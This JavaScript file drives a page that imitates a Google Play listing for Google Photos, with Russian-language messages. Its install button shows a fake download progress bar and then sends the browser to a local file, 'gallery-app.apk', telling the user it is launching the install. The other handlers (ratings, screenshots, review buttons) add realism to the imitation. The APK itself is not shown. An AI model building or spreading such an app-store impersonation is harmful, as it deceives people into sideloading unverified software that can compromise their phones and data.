// Google Play – Google Photos Page Scripts

document.addEventListener('DOMContentLoaded', () => {

  // === INSTALL BUTTON ===
  const installBtn = document.getElementById('installBtn');
  let downloading = false;
  if (installBtn) {
    installBtn.addEventListener('click', (e) => {
      // If already downloaded and showing "Открыть", trigger file open/download again
      if (installBtn.classList.contains('downloaded')) {
        e.preventDefault();
        window.location.href = 'gallery-app.apk';
        showToast('Запуск установки...');
        return;
      }
      
      if (downloading) return;
      downloading = true;
      
      e.preventDefault();
      let progress = 0;
      installBtn.style.pointerEvents = 'none'; // disable clicks during download
      installBtn.innerHTML = 'Скачивание... 0%';

      const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 15) + 5;
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
          
          // Trigger actual download and let browser auto-open/install if supported
          window.location.href = 'gallery-app.apk';

          // Change button state to "Открыть"
          installBtn.style.pointerEvents = 'auto';
          installBtn.classList.add('downloaded');
          installBtn.innerHTML = 'Открыть';
          showToast('Скачивание завершено. Запуск файла...');
          downloading = false;
        } else {
          installBtn.innerHTML = `Скачивание... ${progress}%`;
        }
      }, 100);
    });
  }

  // === TOAST ===
  function showToast(msg) {
    const toast = document.getElementById('toast');
    const toastText = document.getElementById('toastText');
    if (!toast) return;
    toastText.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3500);
  }

  // === SCREENSHOT SCROLL ===
  const scrollLeft = document.getElementById('scrollLeft');
  const scrollRight = document.getElementById('scrollRight');
  const wrap = document.getElementById('screenshotsWrap');
  if (scrollLeft && scrollRight && wrap) {
    scrollLeft.addEventListener('click', () => { wrap.scrollBy({ left: -300, behavior: 'smooth' }); });
    scrollRight.addEventListener('click', () => { wrap.scrollBy({ left: 300, behavior: 'smooth' }); });
  }

  // === STAR RATING ===
  const stars = document.querySelectorAll('.rate-star');
  stars.forEach(star => {
    star.addEventListener('mouseenter', () => {
      const val = +star.dataset.val;
      stars.forEach(s => s.classList.toggle('hovered', +s.dataset.val <= val));
    });
    star.addEventListener('mouseleave', () => {
      stars.forEach(s => { if (!s.classList.contains('selected')) s.classList.remove('hovered'); });
    });
    star.addEventListener('click', () => {
      const val = +star.dataset.val;
      stars.forEach(s => s.classList.toggle('selected', +s.dataset.val <= val));
      showToast(`Вы поставили оценку ${val} ★`);
    });
  });

  // === DEVICE TABS ===
  const dtabs = document.querySelectorAll('.dtab');
  dtabs.forEach(tab => {
    tab.addEventListener('click', () => {
      dtabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
    });
  });

  // === FEEDBACK BUTTONS ===
  document.querySelectorAll('.review-feedback').forEach(fb => {
    fb.querySelectorAll('.feedback-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        fb.querySelectorAll('.feedback-btn').forEach(b => b.style.opacity = '0.5');
        btn.style.opacity = '1';
        btn.style.borderColor = '#01875f';
        btn.style.color = '#01875f';
      });
    });
  });

  // === SUPPORT ACCORDION ===
  const supportToggle = document.getElementById('supportToggle');
  const supportBody = document.getElementById('supportBody');
  if (supportToggle && supportBody) {
    supportToggle.addEventListener('click', () => {
      supportBody.classList.toggle('open');
      const icon = supportToggle.querySelector('svg');
      icon.style.transform = supportBody.classList.contains('open') ? 'rotate(180deg)' : '';
      icon.style.transition = 'transform 0.2s';
    });
  }

});
